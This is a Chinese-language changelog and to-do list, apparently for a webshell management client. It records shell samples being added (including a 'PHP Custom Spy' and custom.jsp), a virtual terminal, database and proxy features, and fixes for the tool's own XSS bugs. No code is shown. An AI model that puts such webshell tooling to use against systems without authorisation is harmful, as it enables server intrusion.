  1. 增加文件管理中可执行文件的提示样式
  2. 调整文件管理中任务面板默认折叠（当有任务时自动展开

### /06
  1. 添加 PHP Custom Spy，及多个 Shell 样本 // Thanks:[@Medicean][medicaean-github]

## 2016/03

### /30
  1. 修正更新菜单栏判断条件（win禁止按钮

### /29 `(v.1.1.1)`
  1. 完成在线更新功能（目前不支持windows以及开发版本

### /26
  1. 文件管理双击：size < 100kb ? 编辑 : 下载
  2. 调整 Custom 方式数据库部分代码 // 2-4:感谢[@Medicean][medicaean-github]
  3. 添加 Shells 目录, 用于存放 shell 样本代码
  4. 添加 `custom.jsp` 服务端样本代码

### /24
  1. 文件管理双击文件进行编辑 //size < 100kb

### /23 `(v1.1.0)`
  1. 优化数据处理截断算法

### /22
  1. 数据分类重命名
  2. 新增代理连接配置 // 感谢[@Medicean][medicaean-github]

### /21
  1. 优化UI组建自适应，在调整窗口大小的时候不刷新就能调整UI尺寸

### /18
  1. 修复数据库XSS安全隐患以及特殊符号处理 // 感谢[@peablog][peablog-github]

### /15
  1. 修复了部分XSS遗留问题（主要在语言模板以及文件管理上还有虚拟终端等，其他地方可能还存在 // 感谢[@loveshell][loveshell-github]

### /14
  1. 修复文件管理中过滤不当引发的xss安全问题
  2. 增加窗口调整大小刷新UI之前弹框提醒用户选择是否刷新
  3. 删除无用语言包（jp）
  4. 更新支持PHP7 // 感谢[@Lupino][Lupino-github]
    1. 删除`core/php/index.jsx`中的`@set_magic_quotes_runtime(0);`
    2. 升级`core/php/template/database/mysql.jsx`中的`mysql`为`mysqli`

### /13
  1. 修复源码中`jquery`库缺失问题

# 待做事项
  * 数据高级搜索功能
  * 数据库配置编辑功能
  * 虚拟终端复制粘贴tab补全
  * 插件模块 //实时编写插件执行、UI以及各种操作API设计
  * 扩展模块 //用于扩展一些高级的功能，懒人必备
  - 代码重构
  - 中文开发文档
  * 英文说明+开发文档
  * nodejs服务端脚本支持
  * python服务端脚本支持


[medicaean-github]: https://github.com/Medicean
[peablog-github]: https://github.com/peablog
[loveshell-github]: https://github.com/loveshell
[Lupino-github]: https://github.com/Lupino
